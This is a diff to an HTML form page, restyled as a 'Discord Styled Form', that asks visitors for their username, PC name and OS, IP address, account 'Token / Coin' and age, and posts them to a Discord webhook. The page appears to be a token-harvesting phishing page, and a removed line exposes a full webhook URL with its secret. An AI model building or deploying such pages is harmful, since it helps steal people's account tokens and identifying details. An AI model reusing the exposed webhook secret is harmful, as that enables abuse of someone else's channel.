@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Clean Submission Form</title>
+<title>Discord Styled Form</title>
 <style>
   body { background:#0f172a; font-family:Arial,sans-serif; color:#e5e7eb; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
-  .form-box { background:#020617; padding:20px; border-radius:12px; width:100%; max-width:420px; box-shadow:0 10px 25px rgba(0,0,0,0.4); }
+  .form-box { background:#020617; padding:20px; border-radius:12px; width:100%; max-width:500px; box-shadow:0 10px 25px rgba(0,0,0,0.4); }
   label { display:block; margin-top:12px; font-size:0.9rem; color:#cbd5f5; }
   input { width:100%; padding:10px; margin-top:6px; border-radius:10px; border:none; outline:none; background:#020617; color:#e5e7eb; }
   button { width:100%; margin-top:16px; padding:12px; border:none; border-radius:12px; background:#6366f1; color:white; font-size:1rem; cursor:pointer; transition: all 0.2s ease; }
@@ -16,19 +16,22 @@
 <body>
 
 <div class="form-box">
-  <h2>🍪 Submission Form</h2>
+  <h2>🍪 User Info Submission</h2>
   
-  <label>Name</label>
-  <input type="text" id="name" placeholder="Your Name">
+  <label>Username</label>
+  <input type="text" id="username" placeholder="Username">
 
-  <label>Age</label>
-  <input type="text" id="age" placeholder="Your Age">
+  <label>PC Name / OS</label>
+  <input type="text" id="pcinfo" placeholder="PC Name, OS">
 
-  <label>Token</label>
+  <label>IP Address</label>
+  <input type="text" id="ip" placeholder="IP Address">
+
+  <label>Token / Coin</label>
   <input type="text" id="token" placeholder="Token">
 
-  <label>IP</label>
-  <input type="text" id="ip" placeholder="IP">
+  <label>Age</label>
+  <input type="text" id="age" placeholder="Age">
 
   <label style="margin-top:12px; font-size:0.8rem;"><input type="checkbox" id="consent"> I confirm this information is correct</label>
 
@@ -37,57 +40,61 @@
 </div>
 
 <script>
-  const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1449687692269981767/I0xHJXi4UNYimnK-PHgOiJacI1Ie7bmMY9JCvi9sDk24fmSSqf8kQ9FTQUg9sUwQ_Mwp";
+const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_HERE";
 
-  async function sendDiscord() {
-    const name = document.getElementById('name').value || "N/A";
-    const age = document.getElementById('age').value || "N/A";
-    const token = document.getElementById('token').value || "N/A";
-    const ip = document.getElementById('ip').value || "N/A";
-    const consent = document.getElementById('consent').checked;
-    const status = document.getElementById('status');
+async function sendDiscord() {
+  const username = document.getElementById('username').value || "N/A";
+  const pcinfo = document.getElementById('pcinfo').value || "N/A";
+  const ip = document.getElementById('ip').value || "N/A";
+  const token = document.getElementById('token').value || "N/A";
+  const age = document.getElementById('age').value || "N/A";
+  const consent = document.getElementById('consent').checked;
+  const status = document.getElementById('status');
 
-    if (!consent) {
-      status.textContent = "Please confirm consent before submitting.";
-      return;
-    }
-
-    const payload = {
-      embeds: [{
-        title: "🍪 Clean Submission",
-        color: 0x6366f1,
-        fields: [
-          { name: "Name", value: name, inline: true },
-          { name: "Age", value: age, inline: true },
-          { name: "Token", value: token, inline: true },
-          { name: "IP", value: ip, inline: true },
-          { name: "Consent", value: "Confirmed", inline: false }
-        ],
-        timestamp: new Date()
-      }]
-    };
-
-    try {
-      const res = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      if (res.ok) {
-        status.textContent = "Submission sent ✅";
-        document.getElementById('name').value = "";
-        document.getElementById('age').value = "";
-        document.getElementById('token').value = "";
-        document.getElementById('ip').value = "";
-        document.getElementById('consent').checked = false;
-      } else {
-        status.textContent = "Failed to send.";
-      }
-    } catch (err) {
-      status.textContent = "Error sending submission.";
-    }
+  if (!consent) {
+    status.textContent = "Please confirm consent before submitting.";
+    return;
   }
+
+  const payload = {
+    embeds: [{
+      title: "🍪 User Info Submission",
+      color: 0x6366f1,
+      fields: [
+        { name: "🧑 Username", value: username, inline: true },
+        { name: "💻 PC / OS", value: pcinfo, inline: true },
+        { name: "🌐 IP", value: ip, inline: true },
+        { name: "🪙 Token", value: token, inline: true },
+        { name: "🎂 Age", value: age, inline: true },
+        { name: "✅ Consent", value: "Confirmed", inline: false }
+      ],
+      timestamp: new Date()
+    }]
+  };
+
+  try {
+    const res = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (res.ok) {
+      status.textContent = "Submission sent ✅";
+      document.getElementById('username').value = "";
+      document.getElementById('pcinfo').value = "";
+      document.getElementById('ip').value = "";
+      document.getElementById('token').value = "";
+      document.getElementById('age').value = "";
+      document.getElementById('consent').checked = false;
+    } else {
+      status.textContent = "Failed to send.";
+    }
+  } catch (err) {
+    status.textContent = "Error sending submission.";
+  }
+}
 </script>
 
 </body>
 </html>
+
